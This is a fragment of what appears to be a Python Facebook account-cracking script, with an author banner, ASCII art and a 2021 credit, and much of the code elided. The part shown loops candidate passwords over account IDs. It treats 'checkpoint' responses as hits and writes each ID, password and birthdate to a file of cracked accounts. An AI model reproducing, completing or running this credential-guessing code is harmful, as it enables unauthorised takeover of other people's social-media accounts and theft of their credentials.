''' SYaM King
   facebook : mai fb aksar use nahi karta
   github : Riazkiller
'''
...
garis = '''_______________riaz___________________________________
'''
...
'########::'####::::'###::::'########:
 ...
 ##:::. ##:'####: ##:::: ##: ########:
..:::::..::....::..:::::..::........::
\x1b[1;101m\x1b[1;97mCreat by : RiAz-AnD DaNiSh => 7 November 2021\x1b[0m
_______________________Riaz___________________________
'''
			...
			for pw in ra_pw:
				...
				if 'checkpoint' in xo:
					try:
						...
						nama = data['name']
						print('\r  \x1b[1;96m[ RIAZ ] ' +rax_x+ ' <-> ' + pw + ' <-> ' + tgllhr)
						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
						save.write('  [ RIAZ ] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
						save.close()
						break
					except(KeyError, IOError):
						tgllhr = " "
					except:pass
					print('\r  \x1b[1;96m [ RIAZ ] ' +rax_x+ ' <-> ' + pw + '       ')
					cp.append(rax_x+'|'+pw)
					save.write('  [ RIAZ ] '+str(rax_x)+' <-> '+str(pw)+'\n')
					save.close()
					break
					continue
